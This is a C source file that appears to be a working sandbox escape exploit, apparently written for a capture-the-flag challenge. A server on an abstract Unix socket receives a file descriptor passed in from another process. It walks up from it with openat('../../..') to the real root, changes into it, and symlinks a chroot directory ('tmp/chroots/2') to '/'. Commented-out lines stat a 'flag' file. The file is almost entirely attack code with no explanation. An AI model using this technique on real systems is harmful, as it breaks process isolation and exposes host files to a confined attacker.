#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include "report.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>

//char *socket_path = "./socket";
char *socket_path = "\0hidden";

void my_err(char * msg)
{
    write_error("server", msg);
}
void my_log(char * msg, int arg)
{
    write_log("server", msg, arg);
}

#define CONTROLLEN  CMSG_LEN(sizeof(int))
static struct cmsghdr   *cmptr = NULL;      /* malloc'ed first time */

int recv_fd(int fd)
{
	int             newfd, nr, status;
	char            *ptr;
	char            buf[4096];
	struct iovec    iov[1];
	struct msghdr   msg;

	status = -1;
	iov[0].iov_base = buf;
	iov[0].iov_len  = sizeof(buf);
	msg.msg_iov     = iov;
	msg.msg_iovlen  = 1;
	msg.msg_name    = NULL;
	msg.msg_namelen = 0;
	if (cmptr == NULL && (cmptr = malloc(CONTROLLEN)) == NULL)
		return(-1);
	msg.msg_control    = cmptr;
	msg.msg_controllen = CONTROLLEN;
	if ((nr = recvmsg(fd, &msg, 0)) < 0) {
		my_err("recvmsg error");
	} else if (nr == 0) {
		my_err("connection closed by server");
		return(-1);
	}
	/*
	* See if this is the final data with null & status.  Null
	* is next to last byte of buffer; status byte is last byte.
	* Zero status means there is a file descriptor to receive.
	*/
	for (ptr = buf; ptr < &buf[nr]; ) {
		if (*ptr++ == 0) {
			if (ptr != &buf[nr-1])
				my_err("message format error");
			status = *ptr & 0xFF;  /* prevent sign extension */
			if (status == 0) {
				if (msg.msg_controllen != CONTROLLEN)
					my_err("status = 0 but no fd");
				newfd = *(int *)CMSG_DATA(cmptr);
			} else {
				newfd = -status;
			}
			nr -= 2;
		}
	}
	return newfd;
}


int main() 
{
	struct sockaddr_un addr;
	char buf[100];
	int fd,cl,rc;

    report("server");

	if ( (fd = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) {
		my_err("socket error");
		exit(-1);
	}

	memset(&addr, 0, sizeof(addr));
	addr.sun_family = AF_UNIX;
	if (*socket_path == '\0') {
		*addr.sun_path = '\0';
		strncpy(addr.sun_path+1, socket_path+1, sizeof(addr.sun_path)-2);
	}

    my_log("binding", 0);
	if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		my_err("bind error");
		exit(-1);
	}

    my_log("listening", 0);
	if (listen(fd, 5) == -1) {
		my_err("listen error");
		exit(-1);
	}

    my_log("accepting", 0);
	if ( (cl = accept(fd, NULL, NULL)) == -1) {
		my_err("accept error");
		return -1;
	}

    my_log("recving", 0);
	int remote_fd = recv_fd(cl);
	my_log("got fd", remote_fd);

    int real_root_fd = openat(remote_fd, "../../..", 0);
    if (real_root_fd < 0)
    {
        my_err("failed to open real_root");
    }
	my_log("root fd", real_root_fd);

	my_log("fchdiring", real_root_fd);
    int ret = fchdir(real_root_fd);
    if (ret != 0)
    {
        my_err("fchdir");
    }

    my_log("link", 0);
    ret = symlink("/", "tmp/chroots/2");
    if (ret != 0)
    {
        my_err("link");
    }
    my_log("linked", 0);

	/* my_log("chrooting", real_root_fd); */
    /* ret = chroot("."); */
    /* if (ret != 0) */
    /* { */
    /*     my_err("chroot"); */
    /* } */
    /*  */
    /* struct stat sb; */
	/* my_log("stating", real_root_fd); */
    /* ret = stat("flag", &sb);  */
    /* if (ret == -1) */
    /* { */
    /*     my_err("stat"); */
    /* } */
    /* my_log("flag stat", sb.st_mode); */

	close(cl);

  return 0;
}

